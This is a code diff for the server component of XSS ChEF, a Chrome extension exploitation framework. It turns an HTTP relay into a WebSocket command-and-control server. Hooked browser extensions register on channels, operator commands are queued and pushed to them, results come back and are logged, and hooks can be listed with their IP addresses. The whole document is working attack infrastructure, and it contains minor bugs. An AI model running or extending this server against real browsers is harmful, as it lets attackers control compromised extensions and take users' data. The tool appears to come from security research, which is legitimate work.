@@ -1,3 +1,4 @@
+#!/usr/bin/env php
 <?php
 /*
     XSS ChEF - Chrome Extension Exploitation framework
@@ -16,43 +17,212 @@
     You should have received a copy of the GNU General Public License
     along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */
-header('Access-Control-Allow-Origin: *');
-ini_set('session.use_cookies', false);
-session_id('dummy'); // use PHP sessions for persistent storage
-session_start();
 
+require_once __DIR__ . '/php-websocket/server/lib/SplClassLoader.php';
+$class_loader = new SplClassLoader('WebSocket', __DIR__ . '/php-websocket/server/lib');
+$class_loader->register();
 
-function nocmds($v) {
-    return strpos($v, '-cmd') === false;
-}
-if (!empty($_GET['delete'])) { // fix memory errors
-    $_SESSION = array();
-    die();
-}
+class xssChefServerApplication extends \WebSocket\Application\Application
+{
+    private $_clients = array();
 
-if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_GET['ch'])) {
-    // push to channel
-    if (empty($_SESSION[$_GET['ch']])) {
-        $_SESSION[$_GET['ch']] = array();
+	protected $resultStorage = array();
+	protected $commandStorage = array();
+	
+	public function onConnect($client)
+    {
+		$id = $client->getClientId();
+        $this->_clients[$id] = $client;		
     }
-    $p = file_get_contents('php://input');
-    $_SESSION[$_GET['ch']][] = json_decode($p);
+	protected function _decodeData($data)
+	{
+		$payload = json_decode($data, true);
+		if($payload === null)
+		{
+			return false;
+		}
+
+		if(isset($payload['cmd']) === false)
+		{
+			return false;
+		}
+		return $payload;
+	}
+	
+	protected function _encodeData($action, $data)
+	{
+		if(empty($action))
+		{
+			return false;
+		}
+		
+		$payload = array(
+			'cmd' => $action,
+			'payload' => $data
+		);
+		return json_encode($data);
+	}
     
-    echo json_encode(count($_SESSION[$_GET['ch']]));
-} else if (!empty($_GET['ch'])) {    
-    // pull from channel
-    if (empty($_SESSION[$_GET['ch']])) {
-        echo json_encode(array());
-    } else {
-        echo json_encode($_SESSION[$_GET['ch']]);
-        unset($_SESSION[$_GET['ch']]);
+
+    public function onDisconnect($client)
+    {
+        $id = $client->getClientId();		
+		unset($this->_clients[$id]);     
     }
-} else { // echo available not-empty channels
-    $list = array();
-    // get channel list
-    foreach (array_filter(array_keys($_SESSION), 'nocmds') as $channel) {
-        $list[] = array('ch' => $channel);
+
+    public function onData($data, $client)
+    {
+        try {
+            $payload = $this->_decodeData($data);		
+            if($payload === false)
+            {
+                throw new Exception('Invalid data format');
+            }
+    
+            $client->lastActive = date('Y-m-d H:i:s');
+            
+            $cmdName = $payload['cmd'];
+    
+            switch ($cmdName) {
+                case 'hello-c2c':
+                    $client->isHook = false;
+                    $client->isC2C = true;
+                break;
+                case 'set-channel':
+                    if (!$client->isC2C) {
+                        throw new Exception("Only c2c can set-channel");
+                    }
+                    $client->channel = $payload['ch'];
+                    $this->pushToc2c($client->channel);
+                break;
+                case 'hello-hook':
+                    $client->isHook = true;
+                    $client->isC2C = false;
+                    $client->channel = $payload['ch'];
+                    echo (date('Y-m-d H:i:s') . '  New hook ' . $client->channel . ' from ' . $client->getClientIp() . "\n") ;
+                    $this->pushToHook($client->channel); // send pending messages
+                    
+                    foreach ($this->_clients as $c) {
+                        if ($c->isC2C) {
+                            $c->send(json_encode(array(array(array(
+                                'type' => 'server_msg', 
+                                'result' => 'New hook: '. $payload['ch'] . ' - ' . $client->getClientIp(),
+                            )))));
+                        }
+                    };
+                break;
+                case 'command': // from c&c to hook
+                    if (!$client->isC2C) {
+                       throw new Exception("Not authorized to send commands");
+                    }
+                    if (!$client->channel) {
+                        throw new Exception("No channel set in connection (command)");
+                    }
+                    if (!$this->commandStorage[$client->channel]) {
+                        $this->commandStorage[$client->channel] = array();
+                    }
+                    $this->logHookCommand($client->channel, $payload['p']);
+                    $this->commandStorage[$client->channel][] = $payload['p'];
+                    $this->pushToHook($client->channel);
+                break;
+                case 'post': // from hook back to c&c 
+                    if (!$client->channel) {
+                        throw new Exception("No channel set in connection (post)");
+                    }
+                    
+                    if (empty($this->resultStorage[$client->channel])) {
+                        $this->resultStorage[$client->channel] = array();
+                    }
+                    $this->logHookResponse($client->channel, $payload['p']);
+                    $this->resultStorage[$client->channel][] = $payload['p'];
+                    $this->pushToc2c($client->channel);
+                break;
+                case 'delete':
+                    if ($client->isC2C) {
+                        $this->resultStorage = array();
+                        $this->commandStorage = array();
+                    }
+                break;
+                case 'list':
+                    if ($client->isC2C) {
+                        $hooks = array();
+                        foreach ($this->_clients as $c) {
+                            if ($c->isHook) {
+                                $hooks[] = array(
+                                    "ch"=> $c->channel,
+                                    "ip"=> $c->getClientIp(),
+                                    "lastActive" => $c->lastActive,
+                                );
+                            }
+                        };
+                        $client->send(json_encode(array(array(array("type" => 'list', "result"=> $hooks)))));
+                    }
+                break;
+                default:
+                    throw new Exception('Unknown command ' . $payload['cmd']);
+            }
+        } catch (Exception $e) {
+            echo $e->getMessage();
+        }
+    }   
+    
+    protected function logHookResponse($channel, $payloads) {
+        foreach ($payloads as $payload) {
+            if (!$payload['type'])
+                return;
+            
+            switch ($payload['type']) {
+                default:
+                    $this->logPayload($channel, "R", json_encode($payload));
+                break;
+            }
+        }
+    }
+        
+    protected function logPayload($channel, $type, $data) {
+        file_put_contents('php://stderr', date('Y-m-d H:i:s') . "\t" . $channel . "\t" . $type . "\t" . $data . "\n");
+    }
+   
+    protected function logHookCommand($channel, $payload) {
+        $this->logPayload($channel, "C", json_encode($payload));
+    }
+
+    protected function push($channel, $flagName, &$container) {
+        foreach ($this->_clients as $c) {
+            if ($c->$flagName && $c->channel == $channel) {
+               if (!empty($container[$channel])) {
+                    $c->send(json_encode($container[$channel]));
+                    unset($container[$channel]);
+                    return;
+               }
+               
+            }
+        }
     }
     
-    echo json_encode($list);
+    protected function pushToc2c($channel) {
+        return $this->push($channel, 'isC2C', $this->resultStorage);
+    }
+    
+    protected function pushToHook($channel) {
+        return $this->push($channel, 'isHook', $this->commandStorage);
+    }
 }
+echo <<<EOF
+XSS ChEF server
+by Krzysztof Kotowicz - kkotowicz at gmail dot com
+
+Usage: php server.php [port]
+Communication is logged to stderr, use php server.php [port] 2>log.txt
+
+EOF;
+
+$port = (!empty($args[1]) ? (int) $args[1] : 8080);
+$ip = '127.0.0.1';
+$server = new \WebSocket\Server($ip, $port, false);
+
+echo (date('Y-m-d H:i:s') . ' ChEF server is listening on port ' . $port . "\n");
+
+$server->setCheckOrigin(false);
+$server->registerApplication('chef', xssChefServerApplication::getInstance());
+$server->run();
